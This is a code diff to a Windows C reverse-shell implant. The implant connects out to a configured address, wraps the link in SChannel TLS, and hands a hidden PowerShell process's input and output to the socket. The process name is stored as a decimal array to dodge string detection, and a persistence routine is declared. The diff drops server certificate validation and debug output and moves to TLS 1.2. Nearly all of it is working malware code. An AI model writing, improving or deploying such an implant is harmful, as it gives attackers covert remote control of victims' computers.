@@ -1,10 +1,11 @@
+#define SECURITY_WIN32
 #include <winsock2.h>
 #include <windows.h>
 #include <stdio.h>
 #include <ws2tcpip.h>
 #include <schannel.h>
 #include <security.h>
-
+#include <sspi.h>
 
 #pragma comment(lib, "Ws2_32.lib")
 #pragma comment(lib, "Secur32.lib")
@@ -18,12 +19,9 @@
     #define PORT 0
 #endif
 
-#define SERVER_CERT "../secret/server.crt"
-
 void persistance(const char* newPath);
 char* conv(int decimal_array[], int array_size);
 DWORD WINAPI ReverseShellThread(LPVOID lpParam);
-PCCERT_CONTEXT LoadServerCert(const char* serverPath);
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
     
     //Create mutex
@@ -122,7 +120,7 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
     
     //Create TCP Socket for each new connection
-    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); 
+    shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
     //Connecting to Target Server
     connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
     if (connection == SOCKET_ERROR){
@@ -134,19 +132,13 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
         }
     }
 
-    //Load Server Cert
-    PCCERT_CONTEXT serverCert;
-    serverCert = LoadServerCert(SERVER_CERT);
-
     //Initialize Secure Channel
     CredHandle credHandle;
     SECURITY_STATUS status;
     SCHANNEL_CRED cred = {
         .dwVersion = SCHANNEL_CRED_VERSION,
-        .dwFlags = SCH_CRED_AUTO_CRED_VALIDATION //Automatically validate server cert
-        | SCH_CRED_NO_DEFAULT_CREDS, //No need Client Cert
-        .grbitEnabledProtocols = SP_PROT_TLS1_CLIENT, //TLS Version 1
-        .paCred = &serverCert //Load Server Cert
+        .dwFlags = SCH_CRED_NO_DEFAULT_CREDS, //No need Client Cert
+        .grbitEnabledProtocols = 0x00000800, //TLS Version 1.2
     };
 
     status = AcquireCredentialsHandle(
@@ -166,14 +158,7 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     status = InitializeSecurityContext(
         &credHandle, NULL, NULL,  ctxtflags, 0, SECURITY_NATIVE_DREP, NULL, 0, &context, &outputBufferDesc, &ctxtflags, NULL
     );
-    printf("InitializeSecurityContext Parameters:\n");
-    printf("Status: 0x%x\n", status);
-    printf("Token: %p, Token Length: %lu\n", outputBufferDesc.pBuffers[0].pvBuffer, outputBufferDesc.pBuffers[0].cbBuffer);
-    printf("Security Token Content:\n");
-    for (DWORD i = 0; i < outputBufferDesc.pBuffers[0].cbBuffer; ++i) {
-        printf("%02x ", ((BYTE*)outputBufferDesc.pBuffers[0].pvBuffer)[i]);
-    }
-    printf("\n");
+
     if (status == SEC_I_CONTINUE_NEEDED) {
         if (send(shell,  outputBufferDesc.pBuffers[0].pvBuffer, outputBufferDesc.pBuffers[0].cbBuffer, 0) == SOCKET_ERROR) {
             printf("Error sending initial token");
@@ -185,7 +170,6 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     } else{
         printf("Error initializing security context: %d", status);
     }
-
     //Recv Socket, Where to Store Data, Max Size to Receive, 0
     recv(shell, RecData, sizeof(RecData), 0);   
     //Set Value of Startup Infra Buffer to 0 (& means address)
@@ -198,7 +182,8 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
     sinfo.wShowWindow = SW_HIDE;
     //Pipe Standard Input, Output and Error to Socket
-    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) shell;
+    sinfo.hStdInput = sinfo.hStdError = sinfo.hStdOutput = (HANDLE) shell;
+
     //powershell in dec
     int decimal_array[] = {112, 111, 119, 101, 114, 115, 104, 101, 108, 108};
     //Calculate array size
@@ -208,12 +193,13 @@ DWORD WINAPI ReverseShellThread(LPVOID lpParam){
     //Using CreateProcess API to spawn cmd
     //NULL, Process to Spawn, NULL, NULL, BOOLEAN, Creation Flags, NULL, NULL, Address of Startup Information Structure, Address of Process Information Structure
     CreateProcess(NULL, str, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+
     //Startup Process
     CloseHandle(pinfo.hProcess);
     CloseHandle(pinfo.hThread);
     //Set Value of Receiving Server Buffer to 0
     ZeroMemory(RecData, sizeof(RecData));
-    
+
 }
 
 char* conv(int decimal_array[], int array_size) {
@@ -227,17 +213,4 @@ char* conv(int decimal_array[], int array_size) {
     str[array_size] = '\0'; 
 
     return str;
-}
-
-PCCERT_CONTEXT LoadServerCert(const char* serverPath){
-    //Reading Cert
-    HANDLE cert = CreateFile(SERVER_CERT, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
-    DWORD fileSize = GetFileSize(cert, NULL);
-    //Allocate Memory
-    BYTE* certBuffer = malloc(fileSize);
-    DWORD readBytes;
-    ReadFile(cert, certBuffer, fileSize, &readBytes, NULL);
-    //Create Cert Context from Cert Buffer
-    PCCERT_CONTEXT certContext = CertCreateCertificateContext(X509_ASN_ENCODING, certBuffer, readBytes);
-    return certContext;
 }
